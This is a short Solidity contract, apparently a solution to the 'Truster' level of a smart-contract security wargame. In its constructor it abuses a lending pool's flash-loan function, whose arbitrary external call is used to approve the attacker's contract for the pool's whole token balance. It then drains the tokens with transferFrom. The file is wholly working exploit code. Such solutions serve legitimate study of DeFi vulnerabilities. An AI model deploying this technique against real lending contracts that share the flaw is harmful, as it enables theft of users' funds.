// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ITrusterLenderPool {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external;
}

contract TrusterExploit {
    constructor(address trusterPool, address token) {

        uint256 amount = IERC20(token).balanceOf(trusterPool);

        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), amount);

        ITrusterLenderPool(trusterPool).flashLoan(0, msg.sender, token, data);

        IERC20(token).transferFrom(trusterPool, msg.sender, amount);
    }
}
